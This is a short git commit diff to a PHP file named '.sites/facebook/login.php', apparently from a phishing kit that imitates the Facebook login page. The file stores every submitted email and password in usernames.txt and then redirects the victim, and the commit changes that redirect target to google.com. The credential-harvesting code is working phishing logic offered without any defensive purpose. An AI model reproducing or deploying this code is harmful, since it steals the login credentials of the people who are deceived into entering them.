9c6d19efaf0910a6d30e14e68d3638006667b164
Lucifer-kin <87801463+Lucifer-kin@users.noreply.github.com>
2021-09-14 23:40:43 +0545

    Update login.php

--- .sites/facebook/login.php
+++ .sites/facebook/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
+header('Location: https://google.com');
 exit();
 ?>
